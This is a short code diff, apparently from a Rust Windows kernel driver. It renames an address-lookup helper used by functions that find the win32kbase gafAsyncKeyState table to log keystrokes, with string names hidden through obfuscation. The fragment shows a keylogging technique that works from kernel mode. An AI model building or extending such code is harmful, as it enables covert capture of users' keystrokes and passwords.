@@ -6,7 +6,7 @@ use {
         utils::{
             process_attach::ProcessAttach,
             get_process_by_name, patterns::scan_for_pattern, 
-            address::{get_address_asynckey, get_module_base_address}, 
+            address::{get_function_address, get_module_base_address}, 
         }
     }, 
     wdk_sys::{
@@ -69,7 +69,7 @@ pub unsafe fn get_user_address_keylogger() -> Option<*mut c_void> {
 ///
 unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
     let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
-    let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
+    let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
 
     // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
     // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
